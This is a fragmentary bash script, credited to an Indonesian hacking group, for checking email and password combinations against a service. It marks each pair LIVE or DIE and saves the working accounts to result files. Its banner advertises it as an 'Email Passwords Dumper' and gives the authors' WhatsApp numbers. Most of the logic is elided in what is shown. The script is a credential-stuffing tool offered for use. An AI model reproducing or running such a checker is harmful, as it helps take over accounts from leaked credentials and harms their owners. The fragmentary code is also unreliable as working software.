...
#DI BUAT OPEN SOURCE KEEP STILL SECRET ANON GHOST [S.A.G]
#SUPAYA KALIAN JUGA BISA BERKARYA
#/////////////////////////////////////////////////////////////////////////
#//Author: By ./Rismell    Developer:CryptoTracker                                 //
...
#//                /NGA USAH BUAT PENCITRAAN          Lupyu Rismell                  //
#/////////////////////////////////////////////////////////////////////////
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
      ...
      then
        ...
        then
           ...
           then
              ...
              then
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked By A. Rahmdani & amell"
              else
                 echo "LIVE => $email$del$pass" >> $acc-$list.txt
                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked By A. Rahmadani & Amell"
              fi
           else
              echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked By A. Rahmadani & Amell"
              echo "bad" >> .0-$list
           fi
        else
          if [[ "$get" = "" ]]
...
if [[ "$hash" = "y" ]];then
   ...
   echo -e "-------[ checked Robotkupintar & by A. Rahmadani Tools checker feat Amell ]--------\n" >> $acc-$list
   echo -e "${N}[*] Done.....\n[+] Result : ${G}$acc-$list${N}"
...
Email Checker && Opensource Email Passwords Dumper In Pro Version LIMITTED EDITIONSv.10
           have a nice day Salam SECRET ANON GHOST [S.A.G]  | Merak Banten Cyber Team | $N
[?] ${G}A. RAHMADANI & AMELL TOOLS PRO LIMITTED EDITIONS MENU${N}
...
;;
 ...
 ;; 
 18) echo -e "
         |${G} A. RAHMADANI & AMEL TOOLS CLI LIMMITED EDITIONS PRO VERSION ${N}|
...
-THANKS TO || INDONESIA SECRET ANON GHOST [S.A.G]  | MERAK BANTEN CYBER TEAM COMMUNITY
-CoD3d By./AMELL 
-Contact WhatsApp : A. Rahmadani : +6288738444826
-Contact WhatsApp : Saskia Amell : +6285975390195.
Get All New Version Contact A. RAHMADANI feat AMELL
Thx to:${O} INDONESIA SECRET ANON GHOST [S.A.G]  | MERAK BANTEN CYBER TEAM COMMUNITY${N}"
